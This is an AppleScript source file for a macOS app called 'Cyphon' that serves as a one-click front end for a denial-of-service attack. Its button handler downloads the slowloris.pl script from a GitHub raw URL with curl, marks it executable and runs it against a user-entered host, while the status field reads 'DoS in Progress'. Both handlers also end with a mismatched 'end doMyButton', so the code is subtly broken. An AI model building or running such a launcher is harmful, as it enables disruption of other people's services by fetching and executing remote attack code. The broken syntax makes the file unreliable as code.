--
--  AppDelegate.applescript
--  Cyphon
--
--  Created by Abilash Menon on 8/3/17.
--  Copyright © 2017 Abilash Menon. All rights reserved.
--

script AppDelegate
	property parent : class "NSObject"
    property myTextField : missing value
    property statusField : missing value
    property progressBar : missing value
    property btnStop : missing value
	
	-- IBOutlets
	property theWindow : missing value
	
	on applicationWillFinishLaunching_(aNotification)
        btnStop's setHidden_(1)
		-- Insert code here to initialize your application before any files are opened 
	end applicationWillFinishLaunching_
	
	on applicationShouldTerminate_(sender)
		-- Insert code here to do any housekeeping before your application quits 
		return current application's NSTerminateNow
	end applicationShouldTerminate_
    
    on myButtonHandler_(sender)
         set currentTextFieldText to myTextField's stringValue() as text
         
        display dialog "Are you sure you want to DoS " & currentTextFieldText with title "Cyphon" with icon 0
        tell application "Terminal"
            activate
        do script "mkdir -p ~/Source && cd ~/Source/"
            do script "curl -O https://raw.githubusercontent.com/abila5h/Cyphon/master/slowloris.pl" in window 1
            do script "chmod +x slowloris.pl" in window 1
            do script "./slowloris.pl -dns  " & currentTextFieldText in window 1
            set current settings of first tab of first window to settings set "Homebrew"
        end tell
statusField's setStringValue_("DoS in Progress")
progressBar's startAnimation_(me)
    btnStop's setHidden_(0)
  
      end doMyButton
    
    on btnStop_(sender)
        tell application "Terminal"
            quit
        end tell
        myTextField's setStringValue_("")
        statusField's setStringValue_("")
        progressBar's stopAnimation_(me)
        btnStop's setHidden_(1)

end doMyButton

end script
